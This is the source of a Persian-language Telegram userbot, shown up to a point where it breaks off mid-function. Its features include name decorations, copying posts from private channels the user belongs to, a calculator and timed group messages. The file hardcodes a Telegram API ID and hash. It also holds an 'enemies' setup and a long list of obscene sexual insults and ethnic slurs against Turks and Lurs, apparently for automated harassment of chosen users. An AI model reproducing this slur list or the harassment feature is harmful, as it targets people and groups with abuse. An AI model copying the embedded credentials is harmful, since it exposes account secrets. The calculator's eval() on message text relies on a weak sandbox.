import requests
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import os, asyncio, aiohttp, random, re, json, time, sys, urllib.parse
from datetime import datetime
import pytz
from pyrogram import enums
from pyrogram.raw import functions
from pyrogram.errors import FloodWait
import hashlib

bot_username = "Gwyg531euvebot"

USER_ID = None
PHONE = None
API_ID = 30671367
API_HASH = "8d259662c4d9977edf79a49b47ca153a"

if len(sys.argv) > 1:
    USER_ID = int(sys.argv[1])
if len(sys.argv) > 2:
    PHONE = sys.argv[2]
if len(sys.argv) > 3:
    API_ID = int(sys.argv[3])
if len(sys.argv) > 4:
    API_HASH = sys.argv[4]

if USER_ID:
    session_name = f"sessions/{USER_ID}"
else:
    session_name = "self"

session_path = f"{session_name}.session"
if not os.path.exists(session_path) and USER_ID:
    print(f"⚠️ فایل session برای کاربر {USER_ID} یافت نشد!")
    print("💡 لطفا ابتدا در ربات مدیریت لاگین کنید.")

app = Client(session_name, api_id=API_ID, api_hash=API_HASH)

SAVED_PHOTOS_DIR = "saved_photos"
INSULTS_FILE = "insults.txt"
ENEMIES_FILE = "enemies.txt"
BACKUPS_DIR = "backups"
online_task = None
self_mode_active = True

action_settings = {
    "typing": False,
    "upload_photo": False,
    "record_audio": False,
    "upload_video": False,
    "upload_document": False,
    "record_video": False,
    "upload_audio": False,
    "upload_video_note": False,
    "record_video_note": False,
    "playing": False,
    "choose_contact": False,
    "find_location": False,
    "choose_sticker": False,
}
ACTION_MAP = {
    "typing": enums.ChatAction.TYPING,
    "upload_photo": enums.ChatAction.UPLOAD_PHOTO,
    "record_audio": enums.ChatAction.RECORD_AUDIO,
    "upload_video": enums.ChatAction.UPLOAD_VIDEO,
    "upload_document": enums.ChatAction.UPLOAD_DOCUMENT,
    "record_video": enums.ChatAction.RECORD_VIDEO,
    "upload_audio": enums.ChatAction.UPLOAD_AUDIO,
    "upload_video_note": enums.ChatAction.UPLOAD_VIDEO_NOTE,
    "record_video_note": enums.ChatAction.RECORD_VIDEO_NOTE,
    "playing": enums.ChatAction.PLAYING,
    "choose_contact": enums.ChatAction.CHOOSE_CONTACT,
    "find_location": enums.ChatAction.FIND_LOCATION,
    "choose_sticker": enums.ChatAction.CHOOSE_STICKER,
}
lock_settings = {
    "همه": False,
    "مدیا": False,
    "استیکر": False,
    "فوروارد": False,
    "ویس": False,
    "پیام": False,
    "فایل": False
}
format_settings = {
    "بولد": False,
    "ایتالیک": False,
    "زیر خط": False,
    "خط‌ خورده": False,
    "اسپویلر": False,
    "کد": False,
    "پیش‌ فرمت": False,
    "نقل ‌قول": False,
}
html_tags = {
    "بولد": "<b>{}</b>",
    "ایتالیک": "<i>{}</i>",
    "زیر خط": "<u>{}</u>",
    "خط‌ خورده": "<s>{}</s>",
    "اسپویلر": "<spoiler>{}</spoiler>",
    "کد": "<code>{}</code>",
    "پیش‌ فرمت": "<pre>{}</pre>",
    "نقل ‌قول": "<blockquote>{}</blockquote>",
}

os.makedirs(SAVED_PHOTOS_DIR, exist_ok=True)
os.makedirs(BACKUPS_DIR, exist_ok=True)

user_format_mode = {}
auto_reactions = {}
anti_login_enabled = False
user_time_status = {}
banners = {}
active_broadcasts = {}
banner_counter = 1
user_original_names = {}
user_fonts = {}
user_cache = {}
CACHE_TIMEOUT = 300
photo_save_active = True
time_updater_started = False
bold_enabled = {}
auto_replies = {}
enemies = set()
always_online_enabled = False

# ==================== قابلیت‌های جدید ====================

# 1. دانلود از کانال‌های خصوصی (پرایوت)
PRIVATE_DOWNLOADS_DIR = "private_downloads"
os.makedirs(PRIVATE_DOWNLOADS_DIR, exist_ok=True)

# 2. شیشه (Glassy Effect) - ارسال متن با جلوه شیشه‌ای
GLASSY_EFFECTS = {
    "شیشه": {
        "style": "background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); border-radius: 15px; padding: 15px;",
        "prefix": "🔮"
    },
    "شیشه مات": {
        "style": "background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px;",
        "prefix": "🌫️"
    },
    "شیشه رنگی": {
        "style": "background: linear-gradient(135deg, rgba(255,0,150,0.1), rgba(0,200,255,0.1)); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.3); border-radius: 25px; padding: 18px;",
        "prefix": "🌈"
    },
    "شیشه الماس": {
        "style": "background: rgba(255,255,255,0.05); backdrop-filter: blur(30px); border: 2px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 25px; box-shadow: 0 0 30px rgba(255,215,0,0.1);",
        "prefix": "💎"
    }
}

# 3. ماشین حساب پیشرفته
CALC_OPERATORS = {
    "+": lambda a, b: a + b,
    "-": lambda a, b: a - b,
    "*": lambda a, b: a * b,
    "/": lambda a, b: a / b if b != 0 else None,
    "^": lambda a, b: a ** b,
    "%": lambda a, b: a % b,
    "//": lambda a, b: a // b,
    "**": lambda a, b: a ** b,
}

# 4. عضویت اجباری
FORCED_SUBSCRIPTIONS = {}  # {"chat_id": {"link": "link", "chat_id": id}}
FORCED_SUBSCRIPTION_ENABLED = False
FORCED_CHAT_ID = None
FORCED_CHAT_LINK = None

# 5. ترجمه پیشرفته
TRANSLATION_API = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={}&dt=t&q={}"
TRANSLATION_LANGUAGES = {
    "فارسی": "fa",
    "انگلیسی": "en",
    "ترکی": "tr",
    "عربی": "ar",
    "فرانسوی": "fr",
    "آلمانی": "de",
    "اسپانیایی": "es",
    "روسی": "ru",
    "ژاپنی": "ja",
    "کرهای": "ko",
    "چینی": "zh-CN",
    "ایتالیایی": "it",
    "پرتغالی": "pt",
    "هندی": "hi",
    "اردو": "ur"
}

# 6. فضول پروفایل (Profile View Tracker)
PROFILE_VIEWS = {}  # {viewer_id: {"user_id": user_id, "username": username, "first_name": name, "last_view": time}}
PROFILE_VIEW_TRACKING = False

# 7. لیست فحش‌های جدید
NEW_INSULTS = [
    "کیرم کون مادرت😂😂😂😂", "بالا باش کیرم کص مادرت😂😂😂", "مادرتو میگام نوچه جون بالا😂😂😂",
    "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو دیگه نوچه",
    "مادرتو میگام اف بشی", "کیرم کون مادرت", "کیرم کص مص مادرت بالا", "کیرم کون مادرت بیناموس",
    "مادرجنده بالا باش", "بیناموس تا کی میخای سطحت گح باشه", "اپدیت شو بیناموس خز بود",
    "ای تورک خر بالا ببینم", "و اما تو بیناموس چموش", "تو یکیو مادرتو میکنم", "کیرم تو ناموصت ",
    "کیر تو ننت", "ریش روحانی تو ننت", "کیر تو مادرت😂😂😂", "کص مادرتو مجر بدم",
    "صلف تو ننت", "بات تو ننت ", "مامانتو میکنم بالا", "وای این تورک خرو", "سطحشو نگا",
    "تایپ کن بیناموس", "خشاب؟", "کیرم کون مادرت بالا", "بیناموس نبینم خسته بشی", "مادرتو بگام؟",
    "گح تو سطحت شرفت رف", "بیناموس شرفتو نابود کردم یه کاری کن", "وای کیرم تو سطحت",
    "بیناموس روانی شدی", "روانیت کردما", "مادرتو کردم کاری کن", "تایپ تو ننت",
    "بیپدر بالا باش", "و اما تو لر خر", "ننتو میکنم بالا باش", "کیرم لب مادرت بالا😂😂😂",
    "چطوره بزنم نصلتو گح کنم", "داری تظاهر میکنی ارومی ولی مادرتو کوص کردم",
    "مادرتو کردم بیغیرت", "هرزه", "وای خدای من اینو نگا", "کیر تو کصننت",
    "ننتو بلیسم", "منو نگا بیناموس", "کیر تو ننت بسه دیگه", "کیر تو شرفت",
    "مادرتو میگام بالا", "کیر تو مادرت", "کونی ننه ی حقیر زاده",
    "کص ننت به صورت ضربدری ", "کص خارت به صورت مستطیلی",
    "ننه سگ ناموس", "منو ننت شما همه چچچچ", "ننه کیر قاپ زن", "ننع اوبی",
    "ننه کیر دزد", "ننه کیونی", "ننه کصپاره", "زنا زادع", "کیر سگ تو کص نتت پخخخ",
    "ولد زنا", "ننه خیابونی", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا",
    "کص نن جندت", "ننه سگ", "ننه کونی", "ننه زیرابی", "بکن ننتم", "ننع فاسد",
    "ننه ساکر", "کس ننع بدخواه", "نگاییدم", "مادر سگ", "ننع شرطی", "گی ننع",
    "بابات شاشیدتت چچچچچچچ", "ننه ماهر", "حرومزاده", "ننه کص", "کص ننت باو",
    "پدر سگ", "سیک کن کص ننت نبینمت", "کونده", "ننه ولو", "ننه سگ", "مادر جنده",
    "کص کپک زدع", "ننع لنگی", "ننه خیراتی", "سجده کن سگ ننع", "ننه خیابونی",
    "ننه کارتونی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت",
    "خوار کیونی", "پا بزن چچچچچ", "مادرتو گاییدم", "گوز ننع", "کیرم تو دهن ننت",
    "ننع همگانی", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "ابجی سگ",
    "کس دست ریدی با تایپ کردنت چچچ", "ابجی جنده", "ننع سگ سیبیل", "بده بکنیم چچچچ",
    "کص ناموس", "شل ناموس", "ریدم پس کلت چچچچچ", "ننه شل", "ننع قسطی",
    "ننه ول", "دست و پا نزن کس ننع", "ننه ولو", "خوارتو گاییدم", "محوی!؟",
    "ننت خوبع!؟", "کس زنت", "شاش ننع", "ننه حیاطی", "نن غسلی", "کیرم تو کس ننت بگو مرسی چچچچ",
    "ابم تو کص ننت", "فاک یور مادر خوار سگ پخخخ", "کیر سگ تو کص ننت", "کص زن",
    "ننه فراری", "بکن ننتم من باو جمع کن ننه جنده /:::", "ننه جنده بیا واسم ساک بزن",
    "حرف نزن که نکنمت هااا :|", "کیر تو کص ننت😐", "کص کص کص ننت😂",
    "کصصصص ننت جووون", "سگ ننع", "کص خوارت", "کیری فیس", "کلع کیری",
    "تیز باش سیک کن نبینمت", "فلج تیز باش چچچ", "بیا ننتو ببر", "بکن ننتم باو ",
    "کیرم تو بدخواه", "چچچچچچچ", "ننه جنده", "ننه کص طلا", "ننه کون طلا",
    "کس ننت بزارم بخندیم!؟", "کیرم دهنت", "مادر خراب", "ننه کونی",
    "هر چی گفتی تو کص ننت خخخخخخخ", "کص ناموست بای", "کص ننت بای ://",
    "کص ناموست باعی تخخخخخ", "کون گلابی!", "ریدی آب قطع", "کص کن ننتم کع",
    "نن کونی", "نن خوشمزه", "ننه لوس", " نن یه چشم ", "ننه چاقال", "ننه جینده",
    "ننه حرصی ", "نن لشی", "ننه ساکر", "نن تخمی", "ننه بی هویت", "نن کس",
    "نن سکسی", "نن فراری", "لش ننه", "سگ ننه", "شل ننه", "ننه تخمی",
    "ننه تونلی", "ننه کوون", "نن خشگل", "نن جنده", "نن ول ", "نن سکسی",
    "نن لش", "کس نن ", "نن کون", "نن رایگان", "نن خاردار", "ننه کیر سوار",
    "نن پفیوز", "نن محوی", "ننه بگایی", "ننه بمبی", "ننه الکسیس", "نن خیابونی",
    "نن عنی", "نن ساپورتی", "نن لاشخور", "ننه طلا", "ننه عمومی", "ننه هر جایی",
    "نن دیوث", "تخخخخخخخخخ", "نن ریدنی", "نن بی وجود", "ننه سیکی", "ننه کییر",
    "نن گشاد", "نن پولی", "نن ول", "نن هرزه", "نن دهاتی", "ننه ویندوزی",
    "نن تایپی", "نن برقی", "نن شاشی", "ننه درازی", "شل ننع", "یکن ننتم که",
    "کس خوار بدخواه", "آب چاقال", "ننه جریده", "ننه سگ سفید", "آب کون",
    "ننه 85", "ننه سوپری", "بخورش", "کس ن", "خوارتو گاییدم", "خارکسده",
    "گی پدر", "آب چاقال", "زنا زاده", "زن جنده", "سگ پدر", "مادر جنده",
    "ننع کیر خور", "چچچچچ", "تیز بالا", "ننه سگو با کسشر در میره",
    "کیر سگ تو کص ننت", "kos kesh", "kiri", "nane lashi", "kos", "kharet",
    "blis kirmo", "دهاتی", "کیرم لا کص خارت", "کص ننت"
]

# =======================================================

FONTS = {
    1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
    2: {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
    3: {'0':'０','1':'１','2':'２','3':'３','4':'۴','5':'۵','6':'۶','7':'۷','8':'۸','9':'۹'},
    4: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
    5: {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
    6: {'0':'0҉','1':'1҉','2':'2҉','3':'3҉','4':'4҉','5':'5҉','6':'6҉','7':'7҉','8':'8҉','9':'9҉'}
}

# ==================== سیستم بال‌های ساعت ====================

WINGS = {
    1: ("❰", "❱"),
    2: ("✧", "✧"),
    3: ("𓆩", "𓆪"),
    4: ("❦", "❦"),
    5: ("ᥫ᭡", "ᥫ᭡"),
    6: ("♛", "♛"),
    7: ("༒︎", "༒︎"),
    8: ("⨺⃝", "⨺⃝"),
    9: ("۝", "۝"),
    10: ("߷", "߷"),
    11: ("ཊ", "ཏ"),
    12: ("࿘", "࿘"),
    13: ("࿇", "࿇"),
    14: ("࿈", "࿈"),
    15: ("፠", "፠"),
    16: ("☫", "☫"),
    17: ("ꙮ‌‌‌‌‌‌", "ꙮ‌‌‌‌‌‌"),
    18: ("▄︻デ", "══━一"),
    19: ("﷽", "﷽"),
    20: ("🝪", "🝪"),
    21: ("🜎", "🜎"),
    22: ("ቿ", "ቿ"),
    23: ("᳇", "᳇"),
    24: ("␥", ""),
    25: ("⟬", "⟭"),
    26: ("꧁", "꧂"),
    27: ("༺", "༻"),
    28: ("𓄂", "𓆃"),
    29: ("۩", "۩"),
    30: ("✞︎", "✞︎"),
    31: ("⨭", "⨮"),
    32: ("𓆰", "𓆪"),
    33: ("𖤍", "𖤍"),
    34: ("❖", "❖"),
    35: ("『", "』"),
    36: ("ʚ", "ɞ"),
    37: ("၄", "၃"),
    38: ("⚚", "⚚"),
    39: ("𝄃𝄂𝄂𝄃", "𝄃𝄂𝄂??"),
    40: ("⁂", "⁂"),
    41: ("⫷", "⫸"),
    42: ("⦓", "⦔"),
    43: ("✤", "✤"),
    44: ("𒆜", "𒆜"),
    45: ("𓂍", "𓂍"),
    46: ("⁘", "⁘"),
    47: ("⧰", "⧱"),
    48: ("⧼", "⧽"),
    49: ("⧪", "⧪"),
    50: ("☬", "☬"),
    51: ("𒉭", "𒉭"),
    52: ("ᯤ", "ᯤ"),
    53: ("三", "三"),
    54: ("🃜", "🃜"),
    55: ("🃚", "🃚"),
    56: ("🃖", "🃖"),
    57: ("🃁", "🃁"),
    58: ("🂭", "🂭"),
    59: ("🂺", "🂺"),
    60: ("𖤓", "𖤓"),
    61: ("☾", "☾"),
    62: ("𐀪", "𐀪"),
    63: ("❅", "❅"),
    64: ("♡", "♡"),
    65: ("(◣", "◢)"),
    66: ("✯", "✯"),
    67: ("❝", "❞"),
    68: ("⊱⋆⊳", "⊲⋆⊰"),
    69: ("「", "」"),
    70: ("𓊈", "𓊉"),
    71: ("𓉘", "𓉝"),
    72: ("𓊆", "𓊇"),
    73: ("[", "]"),
    74: ("╽", "╿"),
    75: ("┞", "┦"),
    76: ("┌", "┐"),
    77: ("⌜", "⌝"),
    78: ("【", "】"),
    79: ("〖", "〗"),
    80: ("⎰", "⎱"),
    81: ("⚟", "⚞"),
    82: ("⸦", "⸧"),
    83: ("╰", "╯"),
    84: ("⦑", "⦒"),
    85: ("☾", "☽"),
    86: ("⌠", "⌡"),
    87: ("⧼", "⧽"),
    88: ("⊰", "⊱"),
    89: ("ཋྀ", "ཐི"),
    90: ("╬", "╬"),
    91: ("《", "》"),
    92: ("★", "★"),
    93: ("#", "#"),
    94: ("Д", "Д"),
    95: ("⑅", "⑅"),
    96: ("♪", "♪"),
    97: ("♬", "♬"),
    98: ("⚕", "⚕"),
    99: ("♀", "♀"),
    100: ("⋆", "⋆"),
    101: ("₊", "₊"),
    102: ("꙳", "꙳"),
    103: ("࿔", "࿔"),
    104: ("❆", "❆"),
    105: ("ꨄ", "ꨄ"),
    106: ("✚", "✚"),
    107: ("✖", "✖"),
    108: ("ᡣ𐭩", "ᡣ𐭩"),
    109: ("❰❰", "❱❱"),
    110: ("❀", "❀"),
    111: ("ထ", "ထ"),
    112: ("╭⊰", "⊱╮"),
    113: ("࿐|", "|࿐"),
    114: ("𓆩♡𓆪", "𓆩♡𓆪"),
    115: ("✦◈", "◈✦"),
    116: ("◉⦿◉", "◉⦿◉"),
    117: ("✨✨", "✨✨"),
    118: ("꧁♢✸", "✸♢꧂"),
    119: ("⋆═✩═⋆", "⋆═✩═⋆"),
    120: ("一═⌊✦⌋", "⌊✦⌋═一"),
    121: ("⋆˚｡⋆୨✧୧˚", "˚୨✧୧⋆｡˚⋆"),
    122: ("▂▃▅▇█▓▒", "▒▓█▇▅▃▂"),
    123: ("▁ ▂ ▃ ▅ ▆ ▇ ▌", "▐ ▇ ▆ ▅ ▃ ▂ ▁"),
    124: ("★.¸¸.•´¯•.¸¸.★", "★.¸¸.•´¯•.¸¸.★"),
    125: ("┗━━━━━━⊱", "⊰━━━━━━┛"),
    126: ("˜”°•.¸☆¸.•°”˜", "˜”°•.¸☆¸.•°”˜"),
    127: ("✧˚·‌‌‌‌˚‌‌‌‌·‌‌‌‌✧·‌‌‌‌˚‌‌‌‌˚·‌‌‌‌✧", "✧˚·‌‌‌‌˚‌‌‌‌‌‌"),
    128: ("˜”°•.¸✦¸.•°”˜", "˜”°•.¸✦¸.•°”˜"),
    129: ("꧁✬◦°⋆⋆°◦.", "◦°⋆⋆°◦✬꧂"),
    130: ("✦▄✦▀✦▄", "▄✦▀✦▄✦"),
    131: ("─═✩✧═─", "─═✧✩═─"),
    132: ("˜”°•✿•°”˜", "˜”°•✿•°”˜"),
    133: ("✦•·.·¯˚·.·•", "•·.·˚¯·.·•✦"),
    134: ("✦⁺₊✩☽⋆", "⋆☾✩⁺₊✦"),
    135: ("⌠═❖═⌡", "⌠═❖═⌡"),
    136: ("▢▣▢▣", "▣▢▣▢"),
    137: ("❚█══", "══█❚"),
    138: ("⋆·˚˚°✦", "✦°˚˚·⋆"),
    139: ("ﮩ٨ـﮩﮩ٨ـ", "ﮩ٨ـﮩﮩ٨ـ"),
    140: ("╭─❖", "❖─╮"),
    141: ("╰┈☆", "☆┈╯"),
    142: ("▞▞▞", "▞▞▞"),
    143: ("⊱❀⊰", "⊱❀⊰"),
    144: ("-♡´-", "-♡´-"),
    145: ("✧【", "】✧"),
    146: ("⌜✺⌟", "⌜✺⌟"),
    147: ("𓆏", "𓆏"),
    148: ("𓆈", "𓆈"),
    149: ("𓄘", "𓄘"),
    150: ("𓄻", "𓄻"),
    151: ("𓂀", "𓂀"),
    152: ("𓀀", "𓀀"),
    153: ("𓆉", "𓆉"),
    154: ("𓅃", "𓅃"),
    155: ("𓆠", "𓆠"),
    156: ("𓅀", "𓅀"),
    157: ("𓄎", "𓄎"),
    158: ("𓄏", "𓄏"),
    159: ("𓅨", "𓅨"),
    160: ("𓅳", "𓅳"),
    161: ("𓅰", "𓅰"),
    162: ("𓆭", "𓆭"),
    163: ("𓂧", "𓂧"),
    164: ("𓃂", "𓃂"),
    165: ("𓅋", "𓅋"),
    166: ("𓅅", "𓅅"),
    167: ("𓀂", "𓀂"),
    168: ("𓀌", "𓀌"),
    169: ("𓅀", "𓅀"),
    170: ("𓃷", "𓃷"),
    171: ("𓅂", "𓅂"),
    172: ("𓂝", "𓂝"),
    173: ("𓃀", "𓃀"),
    174: ("𓆆", "𓆆"),
    175: ("𓆁", "𓆁"),
    176: ("𓃗", "𓃗"),
    177: ("𓄅", "𓄅"),
    178: ("𓆢", "𓆢"),
    179: ("𓃀", "𓃀"),
    180: ("𓃤", "𓃤"),
    181: ("𓂘", "𓂘"),
    182: ("𓅌", "𓅌"),
    183: ("𓂪", "𓂪"),
    184: ("𓃪", "𓃪"),
    185: ("𓆀", "𓆀"),
    186: ("𓈖", "𓈖"),
    187: ("𓄸", "𓄸"),
    188: ("𓇎", "𓇎"),
    189: ("𓅭", "𓅭"),
    190: ("𓆜", "𓆜"),
    191: ("𓇰", "𓇰"),
    192: ("𓈓", "𓈓"),
    193: ("𓉀", "𓉀"),
    194: ("𓇑", "𓇑")
}

user_wings = {}  # {user_id: wing_number}

# ==================== سیستم میو میو ====================

MEOW_SETTINGS = {}  # {chat_id: {"enabled": True, "interval": 300, "text": "میو"}}
MEOW_TASKS = {}  # {chat_id: task}

# =======================================================

# ==================== توابع کمکی جدید ====================

async def get_chat_by_link(link: str):
    """دریافت چت از طریق لینک"""
    try:
        if link.startswith("https://t.me/"):
            username = link.split("https://t.me/")[1].split("/")[0]
            if username.startswith("+"):
                return await app.get_chat(int(username))
            return await app.get_chat(username)
        return None
    except:
        return None

async def translate_text(text: str, target_lang: str = "fa") -> str:
    """ترجمه متن با Google Translate"""
    try:
        encoded_text = urllib.parse.quote(text)
        url = TRANSLATION_API.format(target_lang, encoded_text)
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    if data and len(data) > 0:
                        translated = "".join([part[0] for part in data[0] if part[0]])
                        return translated
        return None
    except:
        return None

def calculate_expression(expression: str):
    """محاسبه عبارت ریاضی پیشرفته"""
    try:
        import math
        expression = expression.replace("×", "*").replace("÷", "/").replace("^", "**")
        allowed_names = {
            k: v for k, v in math.__dict__.items() if not k.startswith("_")
        }
        allowed_names.update({"abs": abs, "round": round, "max": max, "min": min})
        result = eval(expression, {"__builtins__": {}}, allowed_names)
        return result
    except:
        return None

def apply_wings_to_name(name: str, wing_number: int) -> str:
    """اعمال بال به نام با ساعت"""
    if wing_number in WINGS:
        left_wing, right_wing = WINGS[wing_number]
        return f"{left_wing} {name} {right_wing}"
    return name

async def update_name_with_wings(client: Client, user_id: int) -> bool:
    """بروزرسانی نام با بال و زمان"""
    try:
        user = await client.get_users(user_id)
        original_name = user_original_names.get(user_id, user.first_name or "")

        # اگر کاربر زمان فعال دارد
        if user_time_status.get(user_id):
            current_time = get_iran_time()
            name_with_time = f"{original_name} {current_time}"

            # اعمال بال اگر تنظیم شده باشد
            if user_id in user_wings:
                name_with_time = apply_wings_to_name(name_with_time, user_wings[user_id])

            await client.update_profile(first_name=name_with_time)
        else:
            # فقط بال بدون زمان
            if user_id in user_wings:
                name_with_wing = apply_wings_to_name(original_name, user_wings[user_id])
                await client.update_profile(first_name=name_with_wing)

        return True
    except Exception as e:
        print(f"❌ خطا در بروزرسانی نام با بال: {e}")
        return False

# ==================== سیستم میو میو ====================

async def meow_loop(client: Client, chat_id: int):
    """حلقه ارسال میو در گروه"""
    while True:
        try:
            if chat_id not in MEOW_SETTINGS or not MEOW_SETTINGS[chat_id].get("enabled", False):
                break

            interval = MEOW_SETTINGS[chat_id].get("interval", 300)
            text = MEOW_SETTINGS[chat_id].get("text", "میو")

            await client.send_message(chat_id, text)
            await asyncio.sleep(interval)

        except Exception as e:
            print(f"❌ خطا در ارسال میو به گروه {chat_id}: {e}")
            await asyncio.sleep(60)

async def start_meow(client: Client, chat_id: int):
    """شروع ارسال میو در گروه"""
    if chat_id in MEOW_TASKS and MEOW_TASKS[chat_id] is not None:
        MEOW_TASKS[chat_id].cancel()
        try:
            await MEOW_TASKS[chat_id]
        except asyncio.CancelledError:
            pass

    task = asyncio.create_task(meow_loop(client, chat_id))
    MEOW_TASKS[chat_id] = task
    MEOW_SETTINGS[chat_id] = {"enabled": True, "interval": 300, "text": "میو"}

async def stop_meow(chat_id: int):
    """توقف ارسال میو در گروه"""
    if chat_id in MEOW_TASKS and MEOW_TASKS[chat_id] is not None:
        MEOW_TASKS[chat_id].cancel()
        try:
            await MEOW_TASKS[chat_id]
        except asyncio.CancelledError:
            pass
        MEOW_TASKS[chat_id] = None

    if chat_id in MEOW_SETTINGS:
        MEOW_SETTINGS[chat_id]["enabled"] = False

# ==================== هندلرهای جدید ====================

# 1. دانلود از کانال‌های خصوصی (پرایوت) - واقعی
@app.on_message(filters.me & filters.command("پرایوت", prefixes=""))
async def private_download_command(client: Client, message: Message):
    """دانلود پست از کانال‌های خصوصی با لینک - واقعی"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
❌ **فرمت صحیح:**

`پرایوت https://t.me/private_channel/123`

📌 **نکته:** برای دانلود از کانال‌های خصوصی، باید عضو کانال باشید.
""")
            return

        link = message.command[1].strip()
        pattern = r"https://t\.me/(.+?)/(\d+)"
        match = re.match(pattern, link)

        if not match:
            await message.edit_text("❌ **لینک نامعتبر!**\nفرمت صحیح: `https://t.me/channel/123`")
            return

        chat_username = match.group(1)
        post_id = int(match.group(2))

        loading_msg = await message.edit_text("🔄 **در حال دریافت پست از کانال خصوصی...**")

        try:
            post = await client.get_messages(chat_username, post_id)

            if not post:
                await loading_msg.edit_text("❌ **پست یافت نشد!**\nمطمئن شوید که عضو کانال هستید.")
                return

            await loading_msg.edit_text("📥 **در حال کپی کردن پست...**")

            # کپی پست به Saved Messages
            try:
                await post.copy("me")
                await loading_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")
            except Exception as copy_error:
                await loading_msg.edit_text("🔄 **در حال دانلود مستقیم...**")

                if post.media:
                    file_path = await client.download_media(post)
                    if file_path:
                        if post.audio:
                            await client.send_audio("me", file_path, caption=post.caption or "")
                        elif post.video:
                            await client.send_video("me", file_path, caption=post.caption or "")
                        elif post.photo:
                            await client.send_photo("me", file_path, caption=post.caption or "")
                        elif post.document:
                            await client.send_document("me", file_path, caption=post.caption or "")
                        elif post.voice:
                            await client.send_voice("me", file_path, caption=post.caption or "")
                        elif post.sticker:
                            await client.send_sticker("me", file_path)
                        elif post.animation:
                            await client.send_animation("me", file_path, caption=post.caption or "")
                        else:
                            await client.send_document("me", file_path, caption=post.caption or "")

                        os.remove(file_path)
                        await loading_msg.edit_text("✅ **فایل با موفقیت دانلود و ارسال شد**")
                    else:
                        await loading_msg.edit_text("❌ **خطا در دانلود فایل**")
                else:
                    await loading_msg.edit_text("❌ **این پست مدیا ندارد**")

        except FloodWait as e:
            await loading_msg.edit_text(f"⏳ **لطفاً {e.value} ثانیه صبر کنید...**")
            await asyncio.sleep(e.value)
            try:
                post = await client.get_messages(chat_username, post_id)
                if post:
                    await post.copy("me")
                    await loading_msg.edit_text("✅ **پست با موفقیت کپی شد**")
            except:
                await loading_msg.edit_text("❌ **خطا در دریافت پست**")

        except Exception as e:
            await loading_msg.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 2. شیشه (Glassy Effect)
@app.on_message(filters.me & filters.command("شیشه", prefixes=""))
async def glassy_command(client: Client, message: Message):
    """ارسال متن با جلوه شیشه‌ای"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
🔮 **جلوه شیشه‌ای**

📝 **استفاده:**
`شیشه [نوع] [متن]`

🎨 **انواع شیشه:**
• `شیشه` - شیشه ساده
• `شیشه مات` - شیشه مات
• `شیشه رنگی` - شیشه رنگی
• `شیشه الماس` - شیشه الماسی

📌 **مثال:**
`شیشه سلام دنیا!`
`شیشه مات این یک متن شیشه‌ای است`
`شیشه الماس ✨ متن خاص`
""")
            return

        glass_type = "شیشه"
        text_start = 1

        if len(message.command) > 2:
            possible_type = message.command[1]
            if possible_type in GLASSY_EFFECTS:
                glass_type = possible_type
                text_start = 2

        text = ' '.join(message.command[text_start:]).strip()

        if not text:
            await message.edit_text("❌ **لطفا متن را وارد کنید**")
            return

        effect = GLASSY_EFFECTS.get(glass_type, GLASSY_EFFECTS["شیشه"])

        glassy_message = f"""
{effect['prefix']} **{glass_type}**

{text}

* جلوه شیشه‌ای
* پس‌زمینه شفاف
* افکت blur
"""

        await message.edit_text(
            glassy_message,
            parse_mode=enums.ParseMode.MARKDOWN
        )

        try:
            await client.send_message(
                message.chat.id,
                f"{effect['prefix']} {text}",
                reply_to_message_id=message.id
            )
        except:
            pass

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 3. ماشین حساب پیشرفته
@app.on_message(filters.me & filters.command("حساب", prefixes=""))
async def calculator_command(client: Client, message: Message):
    """ماشین حساب پیشرفته"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
🧮 **ماشین حساب پیشرفته**

📝 **استفاده:**
`حساب [عبارت ریاضی]`

📌 **مثال‌ها:**
`حساب 2 + 2`
`حساب 10 * 5 + 3`
`حساب 2 ^ 10`
`حساب (5 + 3) * 2`
`حساب 100 / 4`
`حساب 15 % 4`

🔢 **عملیات پشتیبانی شده:**
+ - * / ^ % ** //

📊 **توابع:**
sqrt, sin, cos, tan, log, log10, abs, round, max, min
""")
            return

        expression = ' '.join(message.command[1:]).strip()
        expression = expression.replace("×", "*").replace("÷", "/")
        expression = expression.replace("^", "**")

        if re.search(r'[^0-9+\-*/()^%. \.,sqrt\(\)sin\(\)cos\(\)tan\(\)log\(\)log10\(\)abs\(\)round\(\)max\(\)min\(\)]', expression):
            await message.edit_text("❌ **عبارت نامعتبر!**\nفقط از اعداد و عملگرهای مجاز استفاده کنید.")
            return

        try:
            import math
            result = eval(expression, {"__builtins__": {}}, {
                "abs": abs, "round": round, "max": max, "min": min,
                "sqrt": math.sqrt, "sin": math.sin, "cos": math.cos,
                "tan": math.tan, "log": math.log, "log10": math.log10,
